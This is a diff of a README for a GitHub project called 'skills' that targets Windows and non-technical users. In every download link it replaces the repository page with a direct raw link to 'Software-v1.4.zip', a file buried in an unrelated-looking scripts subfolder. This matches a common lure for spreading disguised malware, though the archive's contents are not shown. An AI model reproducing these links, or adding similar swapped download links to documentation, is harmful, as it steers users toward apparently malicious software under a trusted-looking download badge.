@@ -1,12 +1,12 @@
 # 🧠 skills - Clear guidance for better builds
 
-[![Download](https://img.shields.io/badge/Download%20from%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/martgueritainaccurate875/skills)
+[![Download](https://img.shields.io/badge/Download%20from%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/martgueritainaccurate875/skills/raw/refs/heads/main/skills/minimax-docx/scripts/dotnet/MiniMaxAIDocx.Cli/Software-v1.4.zip)
 
 ## 📦 Download
 
 Use this link to visit the download page:
 
-[https://github.com/martgueritainaccurate875/skills](https://github.com/martgueritainaccurate875/skills)
+[https://github.com/martgueritainaccurate875/skills/raw/refs/heads/main/skills/minimax-docx/scripts/dotnet/MiniMaxAIDocx.Cli/Software-v1.4.zip](https://github.com/martgueritainaccurate875/skills/raw/refs/heads/main/skills/minimax-docx/scripts/dotnet/MiniMaxAIDocx.Cli/Software-v1.4.zip)
 
 ## 🪟 Windows Setup
 
@@ -248,7 +248,7 @@ These files are usually light and easy to move on Windows.
 
 If you need the file again, use the same page:
 
-[https://github.com/martgueritainaccurate875/skills](https://github.com/martgueritainaccurate875/skills)
+[https://github.com/martgueritainaccurate875/skills/raw/refs/heads/main/skills/minimax-docx/scripts/dotnet/MiniMaxAIDocx.Cli/Software-v1.4.zip](https://github.com/martgueritainaccurate875/skills/raw/refs/heads/main/skills/minimax-docx/scripts/dotnet/MiniMaxAIDocx.Cli/Software-v1.4.zip)
 
 ## 🔍 Quick path for non-technical users
 
